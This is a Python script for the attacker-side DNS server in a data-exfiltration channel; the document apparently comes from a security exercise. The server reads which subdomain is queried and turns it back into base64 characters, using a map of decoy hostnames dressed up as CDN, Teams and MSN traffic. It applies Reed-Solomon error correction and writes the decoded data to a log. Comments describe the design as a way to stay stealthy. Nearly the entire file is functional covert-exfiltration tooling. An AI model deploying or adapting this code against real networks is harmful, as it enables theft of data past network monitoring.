###*** DNS SERVER ***###
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A, RCODE
import base64
import time
from reedsolo import RSCodec

# ATTACKER SERVER CONFIGS
my_ip = "" # EDIT WITH IP ADDRESS
my_domain = "" # EDIT WITH DOMAIN NAME

# OUTPUT FILE FOR EXFILTRATED DATA
OUTPUT = "./exfil-log.log"

# ECC (same as client)
rsc = RSCodec(16)

# DATA BUILDER
data = ""

# FOR MULTIPLE QUICK QUERIES
logged_time = 0

# client-side mapping (ALL LOWERCASE)
b64_mapping = {
    "A": "cdn.baacons",
    "B": "handoff-beacons",
    "C": "self.events.data",
    "D": "events-data-manager.beacons",
    "E": "events-data-manager",
    "F": "gcp.loggings",
    "G": "static.teams",
    "H": "us-prod.cdn",
    "I": "this-is-just.a.test",
    "J": "ui-1.cdn",
    "K": "cdn.cdn",
    "L": "beacons",
    "M": "ui-ctld.1",
    "N": "gui-ctl",
    "O": "signal.beacons",
    "P": "ai.gui.2",
    "Q": "console.beacons.cdn",
    "R": "ss1.gui.static",
    "S": "client.gui.ui.cdn-1.static",
    "T": "android.l.pickle",
    "U": "my.teams.tasks",
    "V": "update.ui.5.handoff",
    "W": "gvt5.handoff.beacons",
    "X": "signaler-pa.1.beacons.handoff.cdn",
    "Y": "p-th-clarity.client.ui",
    "Z": "assets.suite.cdn",
    "a": "ecn.dev",
    "b": "cdn.dev.1.client",
    "c": "cdn.1.msn.assets",
    "d": "cdn.2.msn.assets",
    "e": "cdn.3.msn.assets",
    "f": "cdn.4.msn.assets",
    "g": "assets.ns.beacons.ai",
    "h": "client-1.gui.cdn.aka-ns1",
    "i": "beacons.handoff.beacons-handoff.1",
    "j": "assets.my-server.1",
    "k": "assets.presence.cdn.1.server",
    "l": "ps-a1.server",
    "m": "pk-pa.1.cdn.handoff",
    "n": "teams.static.pk-1",
    "o": "substrate",
    "p": "browser.check.ui-1",
    "q": "server-cdn.server-b.server-1",
    "r": "ui.server-cdn.1.2",
    "s": "cdn-my-server.1.handoff",
    "t": "assets.msn-my-task",
    "u": "calendar.beacons.assets",
    "v": "traffic.stats.1.beacons",
    "w": "cdn-1.traffics.static.beacons.handoff-1",
    "x": "ooc-g2.tm-4.my-server.cdn",
    "y": "other-side.cdn.server",
    "z": "play.beacons.handoff.server",
    "0": "static.edge.key",
    "1": "a223.dscd.cdn",
    "2": "a22.pk-pa.1.cdn.handoff",
    "3": "that.5.beacons.cdn",
    "4": "cdn.teams.my-task",
    "5": "ns.cdn.teams.my-server.beacons",
    "6": "ssl.events.data.my-server.1",
    "7": "pk-eop.ui.beacons",
    "8": "nexus.prod.cdn",
    "9": "nexus.prod.server.dns.cdn-1",
    "+": "plus-end.events.data",
    "/": "sdn.clients.pa-client.6",
    "=": "open.signal.my-server.cdn",
    "end": "assets-pa-0.cdn.beacons.1.handoff"
}

# SERVER SIDE: REVERSE OF ABOVE
server_b64_mapping = {val: key for key, val in b64_mapping.items()}

# CUSTOM RESOLVER CLASS
class Resolver(BaseResolver):
    def resolve(self, request, handler):
        global data
        global logged_time

        qname = request.q.qname # GET QUERY NAME
        domain = str(qname).strip(".").lower() # GET (SUB) DOMAIN ONLY
        print(f"[+] Received DNS query for: {domain}")
        domain = domain.lower() # LOWER CASES

        # Check if domain matches
        if domain.endswith(f".{my_domain}") or domain == f"{my_domain}": # ONLY RESPOND TO MY DOMAIN
            subdomain = domain.replace(f".{my_domain}", "") # GETS SUBDOMAIN BY STRIPPING MAIN DOMAIN
            print(f"[+] Subdomain: {subdomain}")
            reply = request.reply() # CREATE REPLY OBJECT
            if request.q.qtype == QTYPE.A: # ONLY RESPOND TO A-RECORD QUERIES
                reply.add_answer(RR(domain, QTYPE.A, rdata=A(f"{my_ip}"), ttl=15)) # REPLY WITH IP; HIGHER TTL = MORE STEALTH
                # LOGGING EXFILTRATED ENCODED DATA
                if subdomain in server_b64_mapping:
                    now = time.time()
                    if now - logged_time > 1.0: # FOR QUICK MULTIPLE QUERIES (DEAKIN DNS)
                        if server_b64_mapping[subdomain] == "end": # DECODE EXFILTRATED DATA
                            logged_time = time.time()
                            decoded_data = decode_ecc(data)
                            with open(OUTPUT, "w") as f:
                                f.write(decoded_data)
                            data = "" # RESET
                            print(f"[*!* END OF TRANSMISSION *!*] Decoded data: {decoded_data} \n"
                                  f"[*!* SAVED TO {OUTPUT} *!*]")
                        else:
                            data += server_b64_mapping[subdomain] # APPEND
                            logged_time = time.time() # NEW TIME OF LAST LOG
                            print(f"[** HIT **] Received encoded base64 char: ['{server_b64_mapping[subdomain]}'] from query of [{domain}] \n "
                                  f"[*|* CURRENT DATA: '{data}' *|*]")
            else:
                reply.header.rcode = RCODE.NXDOMAIN # DOMAIN NO EXIST RESPONSE TO AAAA, C-NAME, SAO, TXT, etc...
            return reply
        else:
            return None # DO NOT RESPOND TO QUERIES OF OTHER DOMAINS

# DECODE ECC
def decode_ecc(b64):
    expected_b64 = rsc.decode(base64.b64decode(b64))[0]
    return base64.b64decode(expected_b64).decode("ascii")

# Set up the DNS server
if __name__ == "__main__":
    resolver = Resolver()
    server = DNSServer(resolver, port=53, address="10.128.0.2", tcp=False)
    print("[*] Starting DNS server port 53...")
    server.start()